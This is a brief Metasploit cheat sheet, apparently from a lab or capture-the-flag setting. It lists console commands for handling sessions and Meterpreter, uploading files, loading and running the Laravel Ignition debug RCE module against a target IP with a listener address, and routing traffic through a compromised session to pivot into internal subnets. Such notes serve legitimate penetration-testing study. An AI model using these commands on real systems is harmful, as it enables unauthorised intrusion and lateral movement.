- - -
### View sessions

```console
sessions 
```

### Upgrade the last opened session to Meterpreter 

```console
sessions -u -1 
```

### Interact with a session 

```console
sessions -i session_id 
```

### Background the currently interactive session, and go back to the Metasploit prompt 

```console
background
```


### Get information about the remote system, such as OS

```console
sysinfo 
```

### Upload a file or directory 

```console
upload local_file.txt 
```

### Display interfaces 

```console
ipconfig 
```

### Resolve a set of host names on the target to IP addresses - useful for pivoting 

```console
resolve remote_service1 remote_service2
```

### To search for a module, use the ‘search’ command: 

```console
msf6 > search laravel 
``` 

### Load a module with the ‘use’ command 

```console
msf6 > use multi/php/ignition_laravel_debug_rce
```

### view the information about the module, including the module options, description, CVE details, etc 

```console
msf6 exploit(multi/php/ignition_laravel_debug_rce) > info
```

### View the available options to set 

```console
show options
``` 

### Set the target host and logging 

```console
set rhost 10.10.56.197 
set verbose true 
```

### Set the payload listening address; this is the IP address of the host running Metasploit 

```console
set lhost LISTEN_IP 
```

### Run or check the module 

```sh
check
run
```

- - -

### Example usage

```console
route [add/remove] subnet netmask [comm/sid]
```

### Configure the routing table to send packets destined for 172.17.0.1 to the latest opened session

```console
route add 172.17.0.1/32 -1
```

### Configure the routing table to send packets destined for 172.28.101.48/29 subnet to the latest opened session

```console
route add 172.28.10.48/29 -1
```

### Output the routing table

```console
route print
```

